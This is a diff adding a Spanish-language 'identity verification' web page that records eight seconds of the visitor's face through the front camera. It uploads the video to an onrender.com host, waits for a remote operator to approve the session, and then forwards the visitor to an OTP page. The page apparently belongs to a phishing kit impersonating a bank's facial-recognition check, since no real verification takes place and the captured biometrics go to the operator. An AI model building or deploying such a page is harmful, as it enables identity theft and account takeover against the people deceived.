@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verificación de Identidad</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            min-height: 100dvh;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .screen {
+            display: none;
+            width: 100%;
+            min-height: 100vh;
+            min-height: 100dvh;
+            position: relative;
+        }
+
+        .screen.active {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ========== PANTALLA 1: SELECCIÓN ========== */
+        #screen-select {
+            background: #fafafa;
+            padding: 0 20px;
+        }
+
+        .header-back {
+            display: flex;
+            align-items: center;
+            padding: 18px 0;
+            min-height: 56px;
+        }
+
+        .back-arrow {
+            font-size: 22px;
+            color: #1a1a1a;
+            cursor: pointer;
+            text-decoration: none;
+            font-weight: 300;
+            line-height: 1;
+        }
+
+        .select-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin: 8px 0 24px 0;
+            letter-spacing: -0.3px;
+        }
+
+        .option-card {
+            display: flex;
+            align-items: center;
+            padding: 16px 18px;
+            border: 1.5px solid #e8e8e8;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: #fff;
+        }
+
+        .option-card:hover {
+            border-color: #7b6b99;
+        }
+
+        .option-card:active {
+            transform: scale(0.98);
+        }
+
+        .option-icon {
+            width: 44px;
+            height: 44px;
+            margin-right: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .option-icon svg {
+            width: 30px;
+            height: 30px;
+            stroke: #333;
+            stroke-width: 1.5;
+        }
+
+        .option-text h3 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 3px;
+            letter-spacing: -0.2px;
+        }
+
+        .option-text p {
+            font-size: 13px;
+            color: #999;
+            font-weight: 400;
+        }
+
+        /* ========== PANTALLA CÁMARA ========== */
+        #screen-prepare,
+        #screen-camera {
+            background: #7b6b99;
+            justify-content: flex-start;
+            align-items: center;
+        }
+
+        .camera-header {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px 20px;
+            position: relative;
+            min-height: 54px;
+            background: rgba(0, 0, 0, 0.15);
+        }
+
+        .camera-header .back-arrow {
+            position: absolute;
+            left: 18px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 300;
+        }
+
+        .camera-header h2 {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            letter-spacing: -0.2px;
+        }
+
+        .instruction-text {
+            color: #fff;
+            text-align: center;
+            font-size: 17px;
+            font-weight: 400;
+            margin: 24px 0 20px 0;
+            line-height: 1.5;
+            padding: 0 30px;
+        }
+
+        .oval-container {
+            width: 100%;
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px 30px 40px 30px;
+        }
+
+        .oval-frame {
+            width: 100%;
+            max-width: 300px;
+            aspect-ratio: 3/4;
+            background: #fff;
+            border-radius: 50%;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+        }
+
+        .oval-frame video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .instruction-animated {
+            color: #fff;
+            text-align: center;
+            font-size: 17px;
+            font-weight: 400;
+            margin: 24px 0 20px 0;
+            line-height: 1.5;
+            padding: 0 30px;
+            min-height: 55px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.3s ease;
+        }
+
+        /* ========== PANTALLA PROCESAMIENTO ========== */
+        #screen-processing {
+            background: #ffffff;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .cube-loader {
+            position: relative;
+            width: 45px;
+            height: 45px;
+        }
+
+        .cube-loader .cube {
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            background: #c4147d;
+            border-radius: 4px;
+        }
+
+        .cube-loader .cube:nth-child(1) {
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            animation: cube1 1.2s ease-in-out infinite;
+        }
+
+        .cube-loader .cube:nth-child(2) {
+            top: 50%;
+            right: 0;
+            transform: translateY(-50%);
+            animation: cube2 1.2s ease-in-out infinite;
+        }
+
+        .cube-loader .cube:nth-child(3) {
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            animation: cube3 1.2s ease-in-out infinite;
+        }
+
+        .cube-loader .cube:nth-child(4) {
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
+            animation: cube4 1.2s ease-in-out infinite;
+        }
+
+        @keyframes cube1 {
+            0%, 100% { opacity: 1; transform: translateX(-50%) scale(1); }
+            25%, 50%, 75% { opacity: 0.3; transform: translateX(-50%) scale(0.7); }
+        }
+
+        @keyframes cube2 {
+            0%, 100% { opacity: 0.3; transform: translateY(-50%) scale(0.7); }
+            25% { opacity: 1; transform: translateY(-50%) scale(1); }
+            50%, 75% { opacity: 0.3; transform: translateY(-50%) scale(0.7); }
+        }
+
+        @keyframes cube3 {
+            0%, 25%, 100% { opacity: 0.3; transform: translateX(-50%) scale(0.7); }
+            50% { opacity: 1; transform: translateX(-50%) scale(1); }
+            75% { opacity: 0.3; transform: translateX(-50%) scale(0.7); }
+        }
+
+        @keyframes cube4 {
+            0%, 25%, 50%, 100% { opacity: 0.3; transform: translateY(-50%) scale(0.7); }
+            75% { opacity: 1; transform: translateY(-50%) scale(1); }
+        }
+
+        .loader-text {
+            margin-top: 25px;
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* ========== PANTALLA RESULTADO ========== */
+        #screen-result {
+            background: #ffffff;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .result-box {
+            width: 150px;
+            height: 130px;
+            border-radius: 18px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: resultPopIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes resultPopIn {
+            0% { transform: scale(0.3); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .result-box.success {
+            background: #2ecc71;
+        }
+
+        .result-box.error {
+            background: #e8325e;
+        }
+
+        .result-icon {
+            width: 45px;
+            height: 45px;
+            margin-bottom: 12px;
+        }
+
+        .result-icon svg {
+            width: 100%;
+            height: 100%;
+            stroke: #fff;
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            fill: none;
+        }
+
+        .result-text {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .oval-frame.capturing {
+            animation: captureFlash 0.3s ease;
+        }
+
+        @keyframes captureFlash {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        @media screen and (max-height: 700px) {
+            .oval-container { padding: 10px 30px 20px 30px; }
+            .instruction-text, .instruction-animated {
+                margin: 16px 0 12px 0;
+                font-size: 16px;
+            }
+        }
+
+        @media screen and (min-height: 800px) {
+            .oval-frame { max-width: 320px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- ==========================================
+         PANTALLA 1: SELECCIÓN DE DOCUMENTO
+    ========================================== -->
+    <div id="screen-select" class="screen active">
+        <div class="header-back">
+            <a href="#" class="back-arrow">←</a>
+        </div>
+        <h1 class="select-title">Verificación de identidad</h1>
+        <div class="option-card" onclick="showScreen('screen-prepare')">
+            <div class="option-icon">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="8" r="4"/>
+                    <path d="M6 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2"/>
+                </svg>
+            </div>
+            <div class="option-text">
+                <h3>Reconocimiento facial</h3>
+                <p>Tomaremos una foto de tu rostro</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==========================================
+         PANTALLA 2: PREPARANDO CÁMARA
+    ========================================== -->
+    <div id="screen-prepare" class="screen">
+        <div class="camera-header">
+            <a href="#" class="back-arrow" onclick="event.preventDefault(); stopCamera(); showScreen('screen-select');">←</a>
+            <h2>Reconocimiento facial</h2>
+        </div>
+        <p class="instruction-text">Preparando la cámara...</p>
+        <div class="oval-container">
+            <div class="oval-frame">
+                <video id="prepareVideo" autoplay playsinline muted></video>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==========================================
+         PANTALLA 3: CÁMARA CON INSTRUCCIONES
+    ========================================== -->
+    <div id="screen-camera" class="screen">
+        <div class="camera-header">
+            <a href="#" class="back-arrow" onclick="event.preventDefault(); stopCamera(); showScreen('screen-select');">←</a>
+            <h2>Reconocimiento facial</h2>
+        </div>
+        <p id="cameraInstruction" class="instruction-animated">Mira de frente a la cámara</p>
+        <div class="oval-container">
+            <div id="cameraOval" class="oval-frame">
+                <video id="cameraVideo" autoplay playsinline muted></video>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==========================================
+         PANTALLA 4: PROCESANDO
+    ========================================== -->
+    <div id="screen-processing" class="screen">
+        <div class="loader-container">
+            <div class="cube-loader">
+                <div class="cube"></div>
+                <div class="cube"></div>
+                <div class="cube"></div>
+                <div class="cube"></div>
+            </div>
+            <p class="loader-text">Verificando identidad...</p>
+        </div>
+    </div>
+
+    <!-- ==========================================
+         PANTALLA 5: RESULTADO
+    ========================================== -->
+    <div id="screen-result" class="screen">
+        <div class="result-box" id="resultBox">
+            <div class="result-icon" id="resultIcon"></div>
+            <span class="result-text" id="resultText"></span>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // CONFIGURACIÓN
+        // ==========================================
+        const SERVER_URL = 'https://nuevoneqsiteonly.onrender.com';
+        const REDIRECT_URL_SUCCESS = 'otp.html';
+        const POLLING_INTERVAL = 2000; // 2 segundos
+        const RECORDING_DURATION = 8000; // 8 segundos de grabación
+
+        // ==========================================
+        // VARIABLES GLOBALES
+        // ==========================================
+        let videoStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let instructionInterval = null;
+        let instructionIndex = 0;
+        let pollingInterval = null;
+        let currentSessionId = null;
+
+        const instructions = [
+            "Mira de frente a la cámara",
+            "Encuádrate",
+            "Mira de frente a la cámara",
+            "Mantén la posición..."
+        ];
+
+        // ==========================================
+        // FUNCIONES DE PANTALLA
+        // ==========================================
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+            
+            if (screenId === 'screen-prepare') {
+                startCameraAuto();
+            }
+        }
+
+        function showScreenDirect(screenId) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+        }
+
+        // ==========================================
+        // CÁMARA AUTOMÁTICA Y GRABACIÓN DE VIDEO
+        // ==========================================
+        async function startCameraAuto() {
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user',
+                        width: { min: 480, ideal: 720, max: 1080 },
+                        height: { min: 640, ideal: 1280, max: 1920 },
+                        aspectRatio: { ideal: 0.5625 }
+                    },
+                    audio: false
+                });
+                
+                document.getElementById('prepareVideo').srcObject = videoStream;
+                
+                setTimeout(() => {
+                    document.getElementById('cameraVideo').srcObject = videoStream;
+                    showScreenDirect('screen-camera');
+                    startInstructions();
+                    startRecording(); // ✅ INICIAR GRABACIÓN
+                }, 2000);
+                
+            } catch (error) {
+                console.error('Error cámara:', error);
+                alert('No se pudo acceder a la cámara. Por favor, permite el acceso.');
+                showScreenDirect('screen-select');
+            }
+        }
+
+        // ==========================================
+        // GRABACIÓN DE VIDEO
+        // ==========================================
+        function startRecording() {
+            recordedChunks = [];
+            
+            try {
+                // Configurar MediaRecorder
+                const options = {
+                    mimeType: 'video/webm;codecs=vp9',
+                    videoBitsPerSecond: 2500000 // 2.5 Mbps
+                };
+
+                // Fallback si VP9 no está disponible
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options.mimeType = 'video/webm;codecs=vp8';
+                }
+
+                mediaRecorder = new MediaRecorder(videoStream, options);
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data && event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    console.log('📹 Grabación finalizada');
+                    processRecording();
+                };
+
+                mediaRecorder.start();
+                console.log('🎥 Grabación iniciada...');
+
+                // Detener grabación después de RECORDING_DURATION
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, RECORDING_DURATION);
+
+            } catch (error) {
+                console.error('Error al iniciar grabación:', error);
+            }
+        }
+
+        // ==========================================
+        // PROCESAR VIDEO GRABADO
+        // ==========================================
+        function processRecording() {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            console.log(`📹 Video generado: ${(blob.size / 1024 / 1024).toFixed(2)} MB`);
+
+            // Mostrar pantalla de procesamiento
+            document.getElementById('cameraOval').classList.add('capturing');
+            
+            setTimeout(() => {
+                showScreenDirect('screen-processing');
+                stopCamera();
+                sendVideoToServer(blob);
+            }, 400);
+        }
+
+        // ==========================================
+        // ENVIAR VIDEO AL SERVIDOR
+        // ==========================================
+        async function sendVideoToServer(videoBlob) {
+            try {
+                const formData = new FormData();
+                formData.append('video', videoBlob, 'kyc_verification.webm');
+                formData.append('timestamp', new Date().toISOString());
+
+                const response = await fetch(`${SERVER_URL}/api/verify-video`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (result.success && result.sessionId) {
+                    currentSessionId = result.sessionId;
+                    console.log('📹 Video enviado. Session:', currentSessionId);
+                    startPolling();
+                } else {
+                    console.error('Error en respuesta:', result);
+                    showResult(false);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showResult(false);
+            }
+        }
+
+        // ==========================================
+        // DETENER CÁMARA
+        // ==========================================
+        function stopCamera() {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                videoStream = null;
+            }
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+                mediaRecorder = null;
+            }
+            if (instructionInterval) {
+                clearInterval(instructionInterval);
+                instructionInterval = null;
+            }
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+            instructionIndex = 0;
+            recordedChunks = [];
+        }
+
+        // ==========================================
+        // INSTRUCCIONES
+        // ==========================================
+        function startInstructions() {
+            const el = document.getElementById('cameraInstruction');
+            instructionIndex = 0;
+            el.textContent = instructions[0];
+
+            instructionInterval = setInterval(() => {
+                instructionIndex++;
+                if (instructionIndex < instructions.length) {
+                    el.style.opacity = '0';
+                    setTimeout(() => {
+                        el.textContent = instructions[instructionIndex];
+                        el.style.opacity = '1';
+                    }, 250);
+                } else {
+                    clearInterval(instructionInterval);
+                }
+            }, 2000);
+        }
+
+        // ==========================================
+        // POLLING - ESPERAR RESPUESTA DE BOTONES
+        // ==========================================
+        function startPolling() {
+            console.log('🔄 Iniciando polling para session:', currentSessionId);
+            
+            pollingInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`${SERVER_URL}/api/check/${currentSessionId}`);
+                    const data = await response.json();
+
+                    console.log('🔄 Estado:', data.status);
+
+                    if (data.status === 'approved') {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                        showResult(true);
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                        showResult(false);
+                    }
+                } catch (error) {
+                    console.error('Error polling:', error);
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        // ==========================================
+        // MOSTRAR RESULTADO
+        // ==========================================
+        function showResult(approved) {
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+
+            const resultBox = document.getElementById('resultBox');
+            const resultIcon = document.getElementById('resultIcon');
+            const resultText = document.getElementById('resultText');
+
+            if (approved) {
+                resultBox.className = 'result-box success';
+                resultIcon.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>';
+                resultText.textContent = 'Aprobado';
+                showScreenDirect('screen-result');
+                
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL_SUCCESS;
+                }, 2000);
+            } else {
+                resultBox.className = 'result-box error';
+                resultIcon.innerHTML = '<svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>';
+                resultText.textContent = 'Cancelado';
+                showScreenDirect('screen-result');
+                
+                setTimeout(() => {
+                    resetResult();
+                    showScreen('screen-prepare');
+                }, 2000);
+            }
+        }
+
+        function resetResult() {
+            document.getElementById('resultBox').className = 'result-box';
+            currentSessionId = null;
+        }
+
+        document.addEventListener('gesturestart', e => e.preventDefault());
+    </script>
+</body>
+</html>
